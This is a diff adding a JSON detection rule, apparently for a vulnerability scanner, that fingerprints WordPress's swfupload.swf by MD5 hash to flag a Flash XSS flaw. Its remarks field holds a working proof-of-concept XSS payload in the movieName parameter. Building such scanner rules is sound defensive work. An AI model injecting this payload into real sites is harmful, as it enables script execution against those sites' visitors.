@@ -1,0 +1,23 @@
+{
+    "target":"wordpress",
+    "meta":{
+        "name":    "WordPress swfupload.swf FlashXSS",
+        "remarks": "WordPress /wp-includes/js/swfupload/swfupload.swf 文件存在FlashXSS漏洞，POC：swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//",
+        "level":   3,
+        "type":    "XSS",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0073"
+        }
+    },
+    "request":{
+        "path":     "/wp-includes/js/swfupload/swfupload.swf",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "md5",
+        "match": "3a1c6cc728dddc258091a601f28a9c12"
+    }
+}
